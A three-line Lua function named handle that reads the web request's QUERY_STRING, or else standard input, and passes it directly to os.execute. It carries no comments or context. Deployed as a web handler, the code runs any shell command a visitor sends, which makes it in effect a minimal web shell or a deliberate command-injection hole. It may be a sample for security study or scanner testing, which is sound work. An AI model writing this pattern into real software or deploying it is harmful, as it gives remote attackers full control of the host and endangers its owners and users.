function handle()
  local value = os.getenv("QUERY_STRING") or io.read("*a")
  os.execute(value)
end
